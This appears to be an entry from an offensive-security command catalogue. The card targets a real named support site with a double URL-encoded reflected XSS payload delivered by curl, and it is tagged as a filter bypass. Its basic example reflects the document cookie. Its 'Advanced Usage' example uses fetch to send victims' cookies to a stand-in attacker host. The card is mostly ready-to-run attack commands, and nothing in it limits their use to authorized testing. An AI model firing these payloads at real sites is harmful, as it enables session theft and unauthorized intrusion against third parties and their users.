---
id: cmd-test-double-encoded-xss
data: >-
  curl -X GET
  "https://support.rockstargames.com/search?q=%253Cscript%253Ealert(document.cookie)%253C/script%253E"
  -v
tags:
  - xss
  - double-encoding
  - bypass
  - web
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:56:19.701Z'
verified: false
validated: true
submitted: true
---
# test-double-encoded-xss

## Command

```bash
curl -X GET "https://support.rockstargames.com/search?q=%253Cscript%253Ealert(document.cookie)%253C/script%253E" -v
```

## Description

This command exploits potential filter bypass by sending a double URL-encoded XSS payload to a search endpoint, checking for reflection that would execute in a browser.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | HTTP method | Yes |
| `q=...` | Double-encoded payload (e.g., %253C for <) | Yes |
| `-v` | Verbose output | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://support.rockstargames.com/search?q=%253Cscript%253Ealert(document.cookie)%253C/script%253E" -v
```

### Advanced Usage

```bash
curl -X GET "https://support.rockstargames.com/search?q=%253Cscript%253Efetch('http://attacker.com?cookie='+document.cookie)%253C/script%253E" -v
```

## Expected Output

Response showing reflected double-encoded payload, which decodes to executable JavaScript in browser context, potentially alerting cookies.

## Related

- [[Related Procedure: Exploit Reflected XSS]]
